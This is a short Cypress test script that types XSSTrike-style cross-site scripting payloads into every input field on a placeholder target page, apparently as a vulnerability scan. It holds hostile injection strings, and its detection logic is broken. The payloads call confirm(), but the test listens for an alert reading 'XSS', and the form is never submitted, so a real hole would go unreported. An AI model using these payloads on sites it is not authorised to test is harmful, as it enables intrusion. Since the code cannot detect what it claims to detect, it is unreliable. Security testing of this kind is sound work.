/// <reference types="cypress" />
//for multiple input
describe('Input-based XSS Testing', () => {
    const targetUrl = 'http://www.example.com'; // Replace with your target URL
  
    it('Test for Input-based XSS Vulnerabilities', () => {
      // Visit the target URL.
      cy.visit(targetUrl);
  
      // Define an array of payloads for XSSTrike.
      const payloads = [
        "\\';(confirm)()//", "\\';(a=confirm,a())//", "\\';[8].find(confirm)//", "\\';confirm()//"
        // Add more payloads as needed...
      ];
  
      // Loop through the payloads.
      payloads.forEach((payload) => {
        // Find and interact with each input field on the page.
        cy.get('input').each((input, index) => {
          // Type the payload into the current input field.
          cy.wrap(input).type(payload);
  
          // Submit the form or perform any required actions to trigger the payload.
  
          // You can add additional steps based on the specific behavior of the website.
          // For example, clicking a "Submit" button or triggering an event.
  
          // Then, check for signs of a successful XSS attack, such as an alert box.
          cy.on('window:alert', (alertText) => {
            expect(alertText).to.equal('XSS');
          });
        });
      });
    });
  });
